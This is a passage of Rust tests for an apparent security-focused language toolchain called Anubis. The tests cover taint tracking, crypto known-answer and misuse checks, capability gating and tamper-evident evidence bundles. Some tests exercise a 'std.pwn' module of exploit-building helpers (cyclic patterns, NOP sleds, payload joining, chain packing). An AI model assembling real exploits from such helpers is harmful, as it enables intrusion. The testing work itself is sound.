            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert_eq!(String::from_utf8_lossy(&out.stdout).trim(), "42");
    }

    #[test]
    fn phase5_stdlib_not_shadowable_from_project_tree() {
        // User src/std/math.anb must NOT override embedded std.math.
        let dir = unique_test_dir("phase5-stdlib-noshadow");
        let src = dir.join("src");
        std::fs::create_dir_all(src.join("std")).unwrap();
        std::fs::write(
            src.join("std/math.anb"),
            "pub fn math_add(a, b) { return 0; }\n",
        )
        .unwrap();
        std::fs::write(
            dir.join("Anubis.toml"),
            "[package]\nname = \"shadow\"\nversion = \"0.1.0\"\n",
        )
        .unwrap();
        let entry = src.join("main.anb");
        std::fs::write(
            &entry,
            "import std.math;\nfn main() { print(math::math_add(2, 3)); }\n",
        )
        .unwrap();
        let items = resolve::combine_from_entry(&entry).expect("combine");
        let out = backends::run::compile_and_run_items(&items, false, &[]).expect("run");
        assert!(out.status.success());
        // Embedded math_add(2,3) == 5, not the hostile 0.
        assert_eq!(String::from_utf8_lossy(&out.stdout).trim(), "5");
    }

    #[test]
    fn phase5_std_io_taint_and_uses() {
        let dir = unique_test_dir("phase5-io");
        std::fs::create_dir_all(&dir).unwrap();
        // Runtime: write/read without declassify (declassify is check/prove surface).
        let run_src = dir.join("run.anb");
        std::fs::write(
            &run_src,
            r#"
import std.io;
fn main() uses(fs.write, fs.read) {
    let p = "hello_phase5.txt";
    io::write_text(p, "x");
    print(io::read_text(p));
}
"#,
        )
        .unwrap();
        let items = resolve::combine_from_entry(&run_src).expect("combine run");
        // Write-then-read of a constant we just wrote: return is still tainted by policy,
        // but main does not sink it — check should accept.
        typecheck(
            frontend::AST {
                items: items.clone(),
                ..Default::default()
            },
            Mode::Safe,
        )
        .expect("run check");
        let out = backends::run::compile_and_run_items(&items, false, &[]).expect("run");
        assert!(out.status.success());
        assert_eq!(String::from_utf8_lossy(&out.stdout).trim(), "x");

        // Clean check path: declassify before write (typecheck only; declassify is not in run).
        let clean = dir.join("clean.anb");
        std::fs::write(
            &clean,
            r#"
import std.io;
fn main() uses(fs.read, fs.write) {
    let t = io::read_text("hello_phase5.txt");
    let c = declassify(t, "test", "round-trip");
    io::write_text("out.txt", c);
}
"#,
        )
        .unwrap();
        let items = resolve::combine_from_entry(&clean).expect("combine clean");
        typecheck(frontend::AST { items, ..Default::default() }, Mode::Safe).expect("declassify path must check");

        let leak = dir.join("leak.anb");
        std::fs::write(
            &leak,
            r#"
import std.io;
fn main() uses(fs.read, fs.write) {
    let t = io::read_text("hello_phase5.txt");
    io::write_text("out.txt", t);
}
"#,
        )
        .unwrap();
        let items = resolve::combine_from_entry(&leak).expect("combine leak");
        let err = typecheck(frontend::AST { items, ..Default::default() }, Mode::Safe).expect_err("leak must fail");
        assert!(
            err.contains("ANUBIS_INTERPROC_SINK") || err.contains("TAINTED"),
            "got: {err}"
        );
    }

    #[test]
    fn phase5_crypto_hmac_verify_ct_and_aead_roundtrip() {
        use backends::run::compile_and_run_items;
        let dir = unique_test_dir("phase5-crypto");
        std::fs::create_dir_all(&dir).unwrap();
        let entry = dir.join("main.anb");
        std::fs::write(
            &entry,
            r#"
import std.crypto;
fn main() {
    print(crypto::mac_verify("k", "m", crypto::mac_hmac_sha256("k", "m")));
    print(crypto::mac_verify("k", "m", crypto::mac_hmac_sha256("k", "nope")));
    let key = crypto::aead_keygen();
    let nonce = crypto::aead_nonce();
    let ct = crypto::aead_encrypt(key, nonce, "aad", "hello");
    let pt = crypto::aead_decrypt(key, nonce, "aad", ct);
    print(len(pt));
    print(len(crypto::kdf_hkdf_sha256("ikm", "", "info", 32)));
    print(len(crypto::rand_bytes(24)));
    // Known-answer HMAC-SHA256 (Wikipedia / standard test vector)
    print(crypto::mac_hmac_sha256("key", "The quick brown fox jumps over the lazy dog"));
}
"#,
        )
        .unwrap();
        let items = resolve::combine_from_entry(&entry).expect("combine");
        let out = compile_and_run_items(&items, false, &[]).expect("run");
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let lines: Vec<_> = String::from_utf8_lossy(&out.stdout)
            .lines()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect();
        assert_eq!(lines[0], "true");
        assert_eq!(lines[1], "false");
        assert_eq!(lines[2], "5"); // hello
        assert_eq!(lines[3], "32");
        assert_eq!(lines[4], "24");
        assert_eq!(
            lines[5],
            "f7bc83f430538424b13298e6aa6fb143ef4d59a14946175997479dbc2d1a3cd8"
        );
    }

    #[test]
    fn phase5_crypto_aead_wrong_aad_fail_closed() {
        use backends::run::compile_and_run_items;
        let dir = unique_test_dir("phase5-aead-aad");
        std::fs::create_dir_all(&dir).unwrap();
        let entry = dir.join("main.anb");
        std::fs::write(
            &entry,
            r#"
import std.crypto;
fn main() {
    let key = crypto::aead_keygen();
    let n = crypto::aead_nonce();
    let ct = crypto::aead_encrypt(key, n, "aad-good", "payload");
    let _ = crypto::aead_decrypt(key, n, "aad-BAD", ct);
    print("should-not-reach");
}
"#,
        )
        .unwrap();
        let items = resolve::combine_from_entry(&entry).expect("combine");
        let out = compile_and_run_items(&items, false, &[]).expect("spawned");
        assert!(
            !out.status.success(),
            "wrong AAD must fail closed, stderr={}",
            String::from_utf8_lossy(&out.stderr)
        );
        let err = String::from_utf8_lossy(&out.stderr);
        assert!(
            err.contains("ANUBIS_CRYPTO_AEAD_OPEN_FAILED")
                || err.contains("authentication tag mismatch"),
            "got stderr: {err}"
        );
        assert!(!String::from_utf8_lossy(&out.stdout).contains("should-not-reach"));
    }

    #[test]
    fn phase5_crypto_password_pbkdf2_and_argon2id_kats() {
        use backends::run::compile_and_run_items;
        let dir = unique_test_dir("phase5-pwd");
        std::fs::create_dir_all(&dir).unwrap();
        let entry = dir.join("main.anb");
        // Hard KATs: RFC 6070 PBKDF2-HMAC-SHA256 c=1; Argon2id vs RustCrypto argon2 0.5
        std::fs::write(
            &entry,
            r#"
import std.crypto;
fn main() {
    let d1 = crypto::kdf_pbkdf2_hmac_sha256("password", "salt", 1, 32);
    print(crypto::bytes_hex(d1));
    let h = crypto::kdf_argon2id("password", "somesalt", 32, 3, 1, 32);
    print(crypto::bytes_hex(h));
    let d4096 = crypto::kdf_pbkdf2_hmac_sha256("password", "salt", 4096, 32);
    print(crypto::bytes_hex(d4096));
}
"#,
        )
        .unwrap();
        let items = resolve::combine_from_entry(&entry).expect("combine");
        let out = compile_and_run_items(&items, false, &[]).expect("run");
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let lines: Vec<_> = String::from_utf8_lossy(&out.stdout)
            .lines()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect();
        // RFC 6070 §2
        assert_eq!(
            lines[0],
            "120fb6cffcf8b32c43e7225256c4f837a86548c92ccc35480805987cb70be17b"
        );
        // RustCrypto argon2 0.5 hash_password_into (m=32,t=3,p=1)
        assert_eq!(
            lines[1],
            "6d4c5fa26a057c23e3a4f72ae34c64e71398c851f2c79464e3e670ed41b543f9"
        );
        // RFC 6070 c=4096
        assert_eq!(
            lines[2],
            "c5e478d59288c841aa530db6845c4c8d962893a001ce4e11a4963873aa98134a"
        );
    }

    #[test]
    fn phase5_crypto_password_hash_verify_roundtrip() {
        use backends::run::compile_and_run_items;
        let dir = unique_test_dir("phase5-pwd-rt");
        std::fs::create_dir_all(&dir).unwrap();
        let entry = dir.join("main.anb");
        // Argon2id production + PBKDF2 encoding path (was broken: 5-field verify).
        std::fs::write(
            &entry,
            r#"
import std.crypto;
fn main() {
    let stored = crypto::password_hash("correct horse battery staple");
    print(crypto::password_verify("correct horse battery staple", stored));
    print(crypto::password_verify("wrong password", stored));
    let p = crypto::password_hash_pbkdf2("secret");
    print(crypto::password_verify("secret", p));
    print(crypto::password_verify("nope", p));
}
"#,
        )
        .unwrap();
        let items = resolve::combine_from_entry(&entry).expect("combine");
        let out = compile_and_run_items(&items, false, &[]).expect("run");
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let lines: Vec<_> = String::from_utf8_lossy(&out.stdout)
            .lines()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect();
        assert_eq!(lines[0], "true");
        assert_eq!(lines[1], "false");
        assert_eq!(lines[2], "true", "pbkdf2 verify must accept correct password");
        assert_eq!(lines[3], "false");
    }

    #[test]
    fn phase5_crypto_build_path_uses_cargo_not_bare_rustc() {
        // Regression: anubis build / lower_to_native must not use bare rustc (can't link crates).
        use backends::native::lower_to_native;
        let dir = unique_test_dir("phase5-build-crypto");
        std::fs::create_dir_all(&dir).unwrap();
        let entry = dir.join("main.anb");
        std::fs::write(
            &entry,
            r#"
import std.crypto;
fn main() {
    print(crypto::mac_hmac_sha256("k", "m"));
}
"#,
        )
        .unwrap();
        let items = resolve::combine_from_entry(&entry).expect("combine");
        let ast = frontend::AST {
            items: items.clone(),
            ..Default::default()
        };
        let ir = typecheck(ast, Mode::Safe).expect("typecheck");
        let art = lower_to_native(ir, &items, &dir, "crypto_build", false)
            .expect("build must succeed with audited crypto via cargo");
        assert!(
            std::path::Path::new(&art).is_file(),
            "artifact missing: {art}"
        );
    }

    #[test]
    fn phase5_crypto_ed25519_and_phc_and_byte_range() {
        use backends::run::compile_and_run_items;
        let dir = unique_test_dir("phase5-adv");
        std::fs::create_dir_all(&dir).unwrap();
        let entry = dir.join("main.anb");
        std::fs::write(
            &entry,
            r#"
import std.crypto;
fn main() {
    print(crypto::backend());
    let kp = crypto::sign_keygen();
    let sk = kp[0];
    let pk = kp[1];
    let sig = crypto::sign(sk, "hello-ed25519");
    print(crypto::sign_verify(pk, "hello-ed25519", sig));
    print(crypto::sign_verify(pk, "tampered", sig));
    let phc = crypto::password_hash_phc("hunter2-advanced");
    print(crypto::password_verify("hunter2-advanced", phc));
    print(crypto::password_verify("wrong", phc));
}
"#,
        )
        .unwrap();
        let items = resolve::combine_from_entry(&entry).expect("combine");
        let out = compile_and_run_items(&items, false, &[]).expect("run");
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let lines: Vec<_> = String::from_utf8_lossy(&out.stdout)
            .lines()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect();
        assert_eq!(lines[0], "audited-crates");
        assert_eq!(lines[1], "true");
        assert_eq!(lines[2], "false");
        assert_eq!(lines[3], "true");
        assert_eq!(lines[4], "false");

        // Byte-range fail-closed: list element 300 must not truncate into a key byte.
        let bad = dir.join("bad_bytes.anb");
        std::fs::write(
            &bad,
            r#"
import std.crypto;
fn main() {
    let bogus = [300, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31];
    let _ = crypto::aead_encrypt(bogus, crypto::aead_nonce(), "", "x");
    print("reached");
}
"#,
        )
        .unwrap();
        let items = resolve::combine_from_entry(&bad).expect("combine");
        let out = compile_and_run_items(&items, false, &[]).expect("spawn");
        assert!(!out.status.success());
        let err = String::from_utf8_lossy(&out.stderr);
        assert!(
            err.contains("ANUBIS_CRYPTO_BYTE_RANGE"),
            "got: {err}"
        );
    }

    #[test]
    fn phase5_crypto_misuse_rejects_hmac_eq_compare() {
        let err = tc_ok(
            r#"fn main() {
                let t = hmac_sha256("k", "m");
                assert(t == hmac_sha256("k", "m"));
            }"#,
        )
        .expect_err("hmac == must be CRYPTO_MISUSE");
        assert!(err.contains("ANUBIS_CRYPTO_MISUSE"), "got: {err}");

        // Fail-open regression: `if` conditions must be analyzed too.
        let err = tc_ok(
            r#"fn main() {
                if hmac_sha256("k", "m") == "x" { print(1); }
            }"#,
        )
        .expect_err("hmac == in if-cond must be CRYPTO_MISUSE");
        assert!(err.contains("ANUBIS_CRYPTO_MISUSE"), "got: {err}");
    }

    #[test]
    fn phase5_crypto_misuse_rejects_password_hash_eq_compare() {
        let err = tc_ok(
            r#"fn main() {
                assert(password_hash("x") == password_hash("x"));
            }"#,
        )
        .expect_err("password_hash == must be CRYPTO_MISUSE");
        assert!(err.contains("ANUBIS_CRYPTO_MISUSE"), "got: {err}");
    }

    #[test]
    fn phase5_crypto_misuse_rejects_std_crypto_wrapper_eq() {
        let dir = unique_test_dir("phase5-crypto-misuse-std");
        std::fs::create_dir_all(&dir).unwrap();
        let f = dir.join("m.anb");
        std::fs::write(
            &f,
            "import std.crypto;\nfn main() {\n  if crypto::mac_hmac_sha256(\"k\", \"m\") == \"x\" { print(1); }\n}\n",
        )
        .unwrap();
        let items = resolve::combine_from_entry(&f).expect("combine");
        let err = typecheck(frontend::AST { items, ..Default::default() }, Mode::Safe)
            .expect_err("std.crypto mac == must fail");
        assert!(err.contains("ANUBIS_CRYPTO_MISUSE"), "got: {err}");
    }

    #[test]
    fn phase5_callee_uses_propagate_to_caller_safe_gate() {
        // Critical: std wrappers must not launder capabilities past Safe.
        let dir = unique_test_dir("phase5-effect-inherit");
        std::fs::create_dir_all(&dir).unwrap();

        // write_text without uses(fs.write) → forbid
        let w = dir.join("write0.anb");
        std::fs::write(
            &w,
            "import std.io;\nfn main() { io::write_text(\"/tmp/x\", \"y\"); }\n",
        )
        .unwrap();
        let items = resolve::combine_from_entry(&w).expect("combine");
        let err = typecheck(frontend::AST { items, ..Default::default() }, Mode::Safe).expect_err("write must fail");
        assert!(
            err.contains("ANUBIS_EFFECT_FORBIDDEN_IN_MODE") || err.contains("file_write"),
            "got: {err}"
        );

        // run_local without uses(shell) → forbid
        let s = dir.join("shell0.anb");
        std::fs::write(
            &s,
            "import std.pwn;\nfn main() { let _ = pwn::run_local(\"x\", [1]); }\n",
        )
        .unwrap();
        let items = resolve::combine_from_entry(&s).expect("combine");
        let err = typecheck(frontend::AST { items, ..Default::default() }, Mode::Safe).expect_err("shell must fail");
        assert!(
            err.contains("ANUBIS_EFFECT_FORBIDDEN_IN_MODE") || err.contains("shell"),
            "got: {err}"
        );

        // Authorized call site passes check
        let ok = dir.join("ok.anb");
        std::fs::write(
            &ok,
            "import std.io;\nfn main() uses(fs.write) { io::write_text(\"/tmp/x\", \"y\"); }\n",
        )
        .unwrap();
        let items = resolve::combine_from_entry(&ok).expect("combine");
        typecheck(frontend::AST { items, ..Default::default() }, Mode::Safe).expect("authorized write must pass");
    }

    #[test]
    fn phase5_std_pwn_pack_and_cyclic_find() {
        use backends::run::compile_and_run_items;
        let dir = unique_test_dir("phase5-pwn");
        std::fs::create_dir_all(&dir).unwrap();
        let entry = dir.join("main.anb");
        std::fs::write(
            &entry,
            r#"
import std.pwn;
fn main() {
    let le = pwn::pack_le_u32(0x41424344);
    print(pwn::unpack_le_u32(le));
    let be = pwn::pack_be_u16(0x1234);
    print(pwn::unpack_be_u16(be));
    let pat = pwn::cyclic_pattern(32);
    let off = pwn::cyclic_find(32, [pat[4], pat[5], pat[6], pat[7]]);
    print(off);
    print(pwn::hexdump([0x0a, 0x0b]));
}
"#,
        )
        .unwrap();
        let items = resolve::combine_from_entry(&entry).expect("combine");
        let out = compile_and_run_items(&items, false, &[]).expect("run");
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let lines: Vec<_> = String::from_utf8_lossy(&out.stdout)
            .lines()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect();
        // LE 0x41424344
        assert_eq!(lines[0], "1094861636");
        // BE 0x1234
        assert_eq!(lines[1], "4660");
        // offset of bytes at index 4
        assert_eq!(lines[2], "4");
        assert_eq!(lines[3], "0a 0b");
    }

    #[test]
    fn phase5_std_pwn_payload_and_crash_report_helpers() {
        use backends::run::compile_and_run_items;
        let dir = unique_test_dir("phase5-pwn-adv");
        std::fs::create_dir_all(&dir).unwrap();
        let entry = dir.join("main.anb");
        std::fs::write(
            &entry,
            r#"
import std.pwn;
fn main() {
    let j = pwn::junk(8);
    print(len(j));
    print(j[0]);
    let fitted = pwn::fit([1, 2, 3], 5, 0);
    print(len(fitted));
    print(fitted[4]);
    let joined = pwn::payload_join([pwn::pwn_p32(0x41414141), pwn::junk_byte(2, 0x42)]);
    print(len(joined));
    let chain = pwn::chain_u64([1, 2]);
    print(len(chain));
    print(pwn::signal_name(6));
    print(pwn::signal_name(11));
    // Synthetic TargetRun-shaped report fields (no process spawn).
    // Build via run only when research gold is present — here test pure formatters with a fake struct.
    // We only exercise pure helpers that don't need a live TargetRun type:
    print(pwn::offset_report(32, pwn::cyclic_pattern(32)[0]));
    print(pwn::xor_key([1, 2, 3], [0xff]));
    print(len(pwn::nop_sled(4)));
}
"#,
        )
        .unwrap();
        let items = resolve::combine_from_entry(&entry).expect("combine");
        let out = compile_and_run_items(&items, false, &[]).expect("run");
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let lines: Vec<_> = String::from_utf8_lossy(&out.stdout)
            .lines()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect();
        assert_eq!(lines[0], "8");
        assert_eq!(lines[1], "65"); // 'A'
        assert_eq!(lines[2], "5");
        assert_eq!(lines[3], "0");
        assert_eq!(lines[4], "6"); // 4 + 2
        assert_eq!(lines[5], "16"); // 2 * 8
        assert_eq!(lines[6], "SIGABRT");
        assert_eq!(lines[7], "SIGSEGV");
        assert!(lines[8].contains("offset:"), "got {}", lines[8]);
        // xor_key prints a list — just ensure we got a line
        assert!(!lines[9].is_empty());
        assert_eq!(lines[10], "4");
    }

    #[test]
    fn risc0_receipt_fixture() {
        let src = "fn main() { let x = 1; }";
        let ast = parse_source(src).expect("parse risc0 fixture");
        let ir = typecheck(ast, frontend::Mode::Safe).expect("tc");
        assert!(!ir.body.is_empty());
        // would lower to risc0 guest
    }

    #[test]
    fn evidence_bundle_contains_reference_grade_metadata_and_reports() {
        let out_dir = unique_test_dir("reference-evidence");
        std::fs::create_dir_all(&out_dir).unwrap();
        let artifact_path = out_dir.join("artifact-input");
        std::fs::write(&artifact_path, b"reference artifact").unwrap();
        let src = r#"
fn report() {
    research {
        let raw: tainted<u32> = symbolic();
        assume(raw < 10);
        assert(raw > 20);
    }
}
"#;

        let bundle = build_evidence_bundle(
            src,
            "research",
            artifact_path.to_str(),
            vec!["test build".into()],
            &out_dir,
            Some("research"),
            None,
        )
        .expect("bundle");

        for file in [
            "environment.json",
            "source-tree.json",
            "checks.sarif",
            "bounty-report.md",
            "validate.sh",
            "MANIFEST.sha256",
        ] {
            assert!(
                bundle.dir.join(file).exists(),
                "evidence bundle must contain {}",
                file
            );
        }
        assert!(
            bundle
                .manifest
                .checks
                .iter()
                .any(|check| check.name == "solver" && check.status == "FAIL"),
            "bundle should preserve real solver verdicts, not placeholder PASS: {:?}",
            bundle.manifest.checks
        );
        assert_eq!(
            bundle.manifest.verdict, "FAIL",
            "failed solver obligation must fail the bundle"
        );
        assert!(
            !validate_bundle(&bundle.dir).expect("validate failing bundle"),
            "validation must reject bundles with FAIL checks"
        );

        let _ = std::fs::remove_dir_all(&out_dir);
    }

    #[test]
    fn validate_bundle_rejects_tampered_source_snapshot() {
        let out_dir = unique_test_dir("tampered-source");
        std::fs::create_dir_all(&out_dir).unwrap();
        let src = "fn main() { let x = 1; }";
        let bundle = build_evidence_bundle(
            src,
            "safe",
            None,
            vec!["test build".into()],
            &out_dir,
            None,
            None,
        )
        .expect("bundle");

        std::fs::write(bundle.dir.join("source.anubis"), "fn main() { let x = 2; }").unwrap();

        assert!(
            !validate_bundle(&bundle.dir).expect("validate tampered bundle"),
            "tampered source snapshot must invalidate bundle"
        );

        let _ = std::fs::remove_dir_all(&out_dir);
    }

    #[test]
    fn validate_bundle_rejects_tampered_artifact() {
        let out_dir = unique_test_dir("tampered-artifact");
        std::fs::create_dir_all(&out_dir).unwrap();
        let artifact_path = out_dir.join("artifact-input");
        std::fs::write(&artifact_path, b"original artifact bytes").unwrap();
        let src = "fn main() { let x = 1; }";
        let bundle = build_evidence_bundle(
            src,
            "safe",
            artifact_path.to_str(),
            vec!["test build".into()],
            &out_dir,
            None,
            None,
        )
        .expect("bundle");

        std::fs::write(bundle.dir.join("artifact"), b"tampered artifact bytes").unwrap();

        assert!(
            !validate_bundle(&bundle.dir).expect("validate tampered artifact bundle"),
            "tampered artifact must invalidate bundle"
        );

        let _ = std::fs::remove_dir_all(&out_dir);
    }

    #[test]
    fn evidence_bundle_captures_and_hashes_hybrid_sidecars() {
        let out_dir = unique_test_dir("hybrid-sidecar-evidence");
        std::fs::create_dir_all(&out_dir).unwrap();
        let artifact_path = out_dir.join("artifact-input");
        std::fs::write(&artifact_path, b"hybrid host bytes").unwrap();
        std::fs::write(out_dir.join("guest.elf"), b"guest elf bytes").unwrap();
        std::fs::write(out_dir.join("image_id.txt"), b"1 2 3 4 5 6 7 8").unwrap();
        std::fs::write(
            out_dir.join("generated-methods.rs"),
            b"pub const ANUBIS_ID: [u32; 8] = [1,2,3,4,5,6,7,8];",
        )
        .unwrap();
        let src = include_str!("../../examples/research_poc.anubis");

        let bundle = build_evidence_bundle(
            src,
            "research",
            artifact_path.to_str(),
            vec!["test full hybrid build".into()],
            &out_dir,
            Some("hybrid-metal-risc0"),
            None,
        )
        .expect("bundle");

        for file in ["guest.elf", "image_id.txt", "generated-methods.rs"] {
            assert!(
                bundle.dir.join(file).exists(),
                "hybrid evidence bundle must include {}",
                file
            );
        }
        for check in [
            "hybrid_receipt_artifacts",
            "hybrid_guest_elf_hash",
            "hybrid_image_id_txt_hash",
            "hybrid_generated_methods_rs_hash",
        ] {
            assert!(
                bundle
                    .manifest
                    .checks
                    .iter()
                    .any(|item| item.name == check && item.status == "PASS"),
                "hybrid evidence bundle must include PASS check {}: {:?}",
                check,
                bundle.manifest.checks
            );
        }
        std::fs::write(bundle.dir.join("guest.elf"), b"tampered guest").unwrap();
        assert!(
            !validate_bundle(&bundle.dir).expect("validate tampered hybrid sidecar"),
            "tampered hybrid guest ELF must invalidate bundle"
        );

        let _ = std::fs::remove_dir_all(&out_dir);
    }

    #[test]
    fn evidence_bundle_writes_solver_analysis_sidecars() {
        let out_dir = unique_test_dir("solver-analysis-sidecars");
        std::fs::create_dir_all(&out_dir).unwrap();
        let artifact_path = out_dir.join("artifact-input");
        std::fs::write(&artifact_path, b"solver artifact").unwrap();
        let src = r#"
fn bad() {
    research {
        let x: tainted<u32> = symbolic();
        assume(x < 10);
        assert(x > 20);
    }
}
"#;

        let bundle = build_evidence_bundle(
            src,
            "research",
            artifact_path.to_str(),
            vec!["test solver evidence".into()],
            &out_dir,
            Some("research"),
            None,
        )
        .expect("bundle");

        assert!(
            bundle.dir.join("analysis/solver.smt2").exists(),
            "solver SMT sidecar must be written into analysis/"
        );
        assert!(
            bundle.dir.join("analysis/solver_replay.json").exists(),
            "solver replay sidecar must be written into analysis/"
        );

        let _ = std::fs::remove_dir_all(&out_dir);
    }

    #[test]
    fn gate11_metal_parity_observed_lane_contract() {
        // Real contract test: use pure fn + real journal.bin from shipped pipeline (no fallback).
        let cpu_lane = "cpu";
        let metal_lane = "metal-hybrid";
        let unknown = "unknown";
        assert_ne!(cpu_lane, metal_lane);
        assert_ne!(cpu_lane, unknown);

        let base = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("..");
        let candidates = [
            // Committed fixture (survives a worktree clean); the out/ paths are live-run fallbacks.
            base.join("tests/fixtures/gate11_parity_journal.bin"),
            base.join("out/a_plus_gate11_parity/metal_parity_hello_cpu/backend/risc0/journal.bin"),
            base.join("out/a15_gate11_parity/metal_parity_hello_cpu/backend/risc0/journal.bin"),
        ];
        let good_j = candidates
            .iter()
            .find_map(|p| std::fs::read(p).ok())
            .expect("real journal.bin from parity run required for gate11 test (no fallback)");

        let bad_j = vec![0u8; 4];

        // Call the shipped pure fn with real data.
        assert_eq!(
            gate11_fixture_verdict(true, true, cpu_lane, metal_lane, good_j == good_j),
            "PASS"
        );
        assert_eq!(
            gate11_fixture_verdict(true, true, cpu_lane, metal_lane, good_j == bad_j),
            "FAIL"
        );
    }

    #[test]
    fn audit_a_plus_front_door_runs_the_real_gate_suite_not_a_stub() {
        // Regression guard for the "stub front door" category error: the acceptance
        // criteria advertise `audit_a_plus.sh` as running the full sealed gate suite, so
        // it must delegate to the canonical runner and carry none of the old skeleton's
        // stub markers. A green claim over a stub is exactly what this project forbids.
        let script = std::fs::read_to_string(
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../scripts/audit_a_plus.sh"),
        )
        .expect("scripts/audit_a_plus.sh must exist");
        assert!(
            script.contains("audit_unified.sh"),
            "audit_a_plus.sh must delegate to the canonical audit_unified.sh runner"
        );
        for stub_marker in [
            "TODO: add remaining gates",
            "skeleton complete",
            "Full gates added in later phases",
        ] {
            assert!(
                !script.contains(stub_marker),
                "audit_a_plus.sh must not regress to the stub skeleton (found: {stub_marker:?})"
            );
        }
    }

    #[test]
    fn unified_gate_suite_is_fail_closed() {
        // The one command a stranger runs must exit non-zero on any gate FAIL — a green
        // exit over a red gate is the category error the whole project exists to prevent.
        let script = std::fs::read_to_string(
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../scripts/audit_unified.sh"),
        )
        .expect("scripts/audit_unified.sh must exist");
        assert!(
            script.contains("fail -gt 0"),
            "unified suite verdict must key off the failing-gate count"
        );
        assert!(
            script.contains(r#"VERDICT="FAIL""#),
            "unified suite must be able to reach a FAIL verdict"
        );
        assert!(
            script.contains("exit 1"),
            "unified suite must exit non-zero on a FAIL verdict"
        );
    }

    #[test]
    fn ci_workflow_enforces_the_real_gate_suite_not_a_weak_subset() {
        // Regression guard for the "CI green over a red gate" seam: CI must enforce the
        // SAME front door a stranger runs on a fresh clone (audit_a_plus.sh -> the 15-gate
        // audit_unified.sh), not a hand-picked handful of cargo commands. Before this was
        // fixed, CI ran `cargo test` (missing --all, so the tools crate's tests never ran)
        // and never invoked gates G5-G15 at all — a push could be green in CI while the
        // language/PCA/prove/offensive gates were red.
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("..");
        let ci = std::fs::read_to_string(root.join(".github/workflows/ci.yml"))
            .expect(".github/workflows/ci.yml must exist");
        // (1) CI must invoke the real front door.
        assert!(
            ci.contains("scripts/audit_a_plus.sh") || ci.contains("scripts/audit_unified.sh"),
            "CI must run the real sealed gate suite (audit_a_plus.sh / audit_unified.sh), not a weak subset"
        );
        // (2) The suite CI points at must actually be the full 15-gate runner — guard against
        // CI running a runner that has been hollowed out to fewer gates.
        let runner = std::fs::read_to_string(root.join("scripts/audit_unified.sh"))
            .expect("scripts/audit_unified.sh must exist");
        for g in 1..=15 {
            let marker = format!("\"G{g}_");
            assert!(
                runner.contains(&marker),
                "audit_unified.sh must run gate G{g} (missing marker {marker:?})"
            );
        }
    }

    #[test]
    fn gate11_metal_parity_unknown_forces_not_yes() {
        let observed = "unknown";
        let require_metal = true;
        let would_be_yes = observed == "metal-hybrid";
        assert!(!(require_metal && would_be_yes)); // unknown + require_metal must not yield YES
    }

    #[test]
    fn gate11_metal_parity_journal_tamper_causes_fail() {
        // Tamper simulation using real journal.bin bytes + pure fn (no fallback, no inline if).
        let base = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("..");
        let candidates = [
            // Committed fixture (survives a worktree clean); the out/ paths are live-run fallbacks.
            base.join("tests/fixtures/gate11_parity_journal.bin"),
            base.join("out/a_plus_gate11_parity/metal_parity_hello_cpu/backend/risc0/journal.bin"),
            base.join("out/a15_gate11_parity/metal_parity_hello_cpu/backend/risc0/journal.bin"),
        ];
        let good = candidates
            .iter()
            .find_map(|p| std::fs::read(p).ok())
            .expect("real journal.bin required for gate11 tamper test");
        let tampered: Vec<u8> = good.iter().map(|b| b ^ 0xff).collect();
        assert_eq!(
            gate11_fixture_verdict(true, true, "cpu", "metal-hybrid", good == good),
            "PASS"
        );
        assert_eq!(
            gate11_fixture_verdict(true, true, "cpu", "metal-hybrid", good == tampered),
            "FAIL"
        );
    }

    #[test]
    fn validate_bundle_rejects_nested_risc0_sidecar_tamper() {
        let out_dir = unique_test_dir("nested-risc0-tamper");
        std::fs::create_dir_all(&out_dir).unwrap();
        let artifact_path = out_dir.join("artifact-input");
        let risc0_dir = out_dir.join("backend/risc0");
        std::fs::create_dir_all(risc0_dir.join("guest/src")).unwrap();
        std::fs::write(&artifact_path, b"host artifact").unwrap();
        std::fs::write(out_dir.join("guest.elf"), b"flat guest").unwrap();
        std::fs::write(out_dir.join("image_id.txt"), b"1 2 3 4 5 6 7 8").unwrap();
        std::fs::write(
            out_dir.join("generated-methods.rs"),
            b"pub const GUEST_ID: [u32; 8] = [1,2,3,4,5,6,7,8];",
        )
        .unwrap();
        std::fs::write(risc0_dir.join("guest.elf"), b"nested guest").unwrap();
        std::fs::write(risc0_dir.join("image_id.txt"), b"1 2 3 4 5 6 7 8").unwrap();
        std::fs::write(risc0_dir.join("receipt.bin"), b"real receipt bytes").unwrap();
        // The evidence check validates the metal-hybrid reference by EXISTENCE + STRUCTURE
        // (reference_path is a real dir; vendored_patch_path == {ref}/vendor/risc0-circuit-rv32im
        // carrying a Cargo.toml) rather than by matching a fixed env-var string. Build that
        // structure under the test's isolated out_dir so the FRESH bundle validates for the right
        // reason before we tamper the nested receipt.
        let metal_ref = out_dir.join("metal-ref");
        let vendor_patch = metal_ref.join("vendor/risc0-circuit-rv32im");
        std::fs::create_dir_all(&vendor_patch).unwrap();
        std::fs::write(
            vendor_patch.join("Cargo.toml"),
            b"[package]\nname = \"risc0-circuit-rv32im\"\n",
        )
        .unwrap();
        std::fs::write(
            risc0_dir.join("risc0_metadata.json"),
